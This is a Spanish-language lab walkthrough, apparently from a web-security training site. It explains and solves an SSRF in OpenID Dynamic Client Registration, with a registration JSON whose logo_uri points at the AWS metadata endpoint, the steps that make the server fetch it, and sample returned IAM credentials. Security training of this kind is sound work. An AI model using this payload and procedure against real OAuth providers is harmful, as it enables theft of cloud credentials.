# 2. SSRF vía Registro Dinámico de Cliente OpenID

## 🔁 SSRF vía registro dinámico de cliente OpenID

### 📄 **Descripción del laboratorio**

Este laboratorio permite que aplicaciones cliente se registren dinámicamente en el proveedor OAuth mediante un endpoint de **Dynamic Client Registration**.

Debido a un uso inseguro de ciertos parámetros del cliente, es posible explotar una **Server-Side Request Forgery (SSRF)** desde el propio proveedor OAuth.

El objetivo es acceder al endpoint interno del servicio de metadata cloud:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
```

y obtener la **SecretAccessKey** del entorno cloud del proveedor OAuth.

Credenciales proporcionadas:

```
wiener : peter
```

***

### 📚 Teoría

#### 📌 Registro dinámico de clientes en OpenID Connect

OpenID Connect permite que nuevas aplicaciones cliente se registren automáticamente mediante un endpoint público conocido como **Dynamic Client Registration**.

Durante este registro el cliente puede proporcionar distintos parámetros, por ejemplo:

```
redirect_uris
logo_uri
```

Tras el registro, el proveedor devuelve información del cliente como:

```
client_id
client_secret
```

#### 📌 SSRF mediante parámetros de cliente

El problema aparece cuando el servidor utiliza valores proporcionados por el cliente para realizar peticiones HTTP.

En este laboratorio el campo vulnerable es:

```
logo_uri
```

El servidor:

* almacena la URL proporcionada
* realiza una petición HTTP a esa dirección cuando intenta recuperar el logo del cliente

Si no existe validación adecuada del dominio o protocolo, el atacante puede forzar al servidor a realizar peticiones hacia:

* servicios internos
* redes privadas
* servicios de metadata cloud

Esto convierte `logo_uri` en un **vector SSRF directo**.

#### 📌 Metadata service en entornos cloud

Muchos proveedores cloud exponen credenciales internas mediante un endpoint accesible desde la propia máquina.

En AWS este endpoint suele ser:

```
169.254.169.254
```

A través de este servicio es posible obtener credenciales IAM temporales si el servidor tiene permisos asociados.

Si una SSRF permite acceder a esta dirección, un atacante puede obtener claves sensibles como:

```
AccessKeyId
SecretAccessKey
Token
```

### 📝 Práctica

#### 1️⃣ Analizar el flujo OAuth

Iniciamos sesión con las credenciales:

```
wiener : peter
```

<figure><img src="../../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

Interceptamos el flujo OAuth con **Burp Suite**.

Observamos un flujo típico que redirige hacia:

```
/oauth-callback?code=...
```

<figure><img src="../../../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>

***

#### 2️⃣ Enumerar endpoints OpenID

Buscamos el endpoint estándar de configuración OpenID:

```
/.well-known/openid-configuration
```

<figure><img src="../../../.gitbook/assets/image (351).png" alt=""><figcaption></figcaption></figure>

La respuesta devuelve un documento JSON con varios endpoints relevantes.

Entre ellos aparece:

```
"registration_endpoint": "/reg"
```

Este endpoint permite registrar clientes dinámicamente.

<figure><img src="../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

***

#### 3️⃣ Probar el endpoint de registro

Accedemos al endpoint:

```
/reg
```

Una petición GET devuelve un error.

<figure><img src="../../../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>

Probamos ahora con una petición POST sin datos.

El servidor responde:

```
400 Bad Request
```

indicando que espera un cuerpo JSON.

Esto confirma que el endpoint acepta registros dinámicos.

<figure><img src="../../../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

***

#### 4️⃣ Registrar un cliente legítimo

Enviamos una petición mínima válida:

```json
{
 "redirect_uris": ["https://test.com"]
}
```

El servidor responde con:

```
200 OK
```

y devuelve un JSON que contiene:

```
client_id
client_secret
```

Esto confirma que el registro dinámico está habilitado sin autenticación.

<figure><img src="../../../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

***

#### 5️⃣ Identificar el punto SSRF

Durante el flujo OAuth observamos que el servidor intenta recuperar el logo del cliente mediante la ruta:

```
/client/<client_id>/logo
```

<figure><img src="../../../.gitbook/assets/image (265).png" alt=""><figcaption></figcaption></figure>

Si no existe un logo configurado, la respuesta es:

```
204 No Content
```

Esto indica que el servidor intenta obtener el recurso definido en `logo_uri`.

<figure><img src="../../../.gitbook/assets/image (236).png" alt=""><figcaption></figcaption></figure>

***

#### 6️⃣ Registrar un cliente malicioso

Registramos un nuevo cliente incluyendo un valor malicioso en `logo_uri`:

```json
{
 "redirect_uris": ["https://test.com"],
 "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

El servidor devuelve un nuevo `client_id`.

<figure><img src="../../../.gitbook/assets/image (237).png" alt=""><figcaption></figcaption></figure>

***

#### 7️⃣ Disparar la SSRF

Utilizamos el client\_id generado para acceder al endpoint:

```
/client/<client_id>/logo
```

<figure><img src="../../../.gitbook/assets/image (238).png" alt=""><figcaption></figcaption></figure>

El servidor realiza una petición HTTP interna hacia el metadata service.

La respuesta contiene credenciales del entorno cloud, por ejemplo:

```json
{
 "Code": "Success",
 "AccessKeyId": "d6Wdh83Z5cH8pkZybhW3",
 "SecretAccessKey": "o2UuaOAHkry2iMlmHtNKlrp1xegmqOi4eLeUZC6b",
 "Token": "...",
 "Expiration": "2032-01-19T10:36:10.941915850Z"
}
```

Esto confirma que la SSRF ha permitido acceder al servicio de metadata.

***

#### 8️⃣ Completar el laboratorio

Copiamos el valor de:

```
SecretAccessKey
```

Lo introducimos en el campo de solución del laboratorio.

El laboratorio se marca como completado.

<figure><img src="../../../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

***

#### 9️⃣ Resultado

Mediante una vulnerabilidad de **SSRF en el registro dinámico de clientes OpenID** se ha conseguido:

* registrar un cliente OAuth malicioso
* controlar el valor del parámetro `logo_uri`
* forzar al servidor OAuth a realizar peticiones internas
* acceder al metadata service del entorno cloud
* obtener credenciales IAM sensibles

El laboratorio queda resuelto.
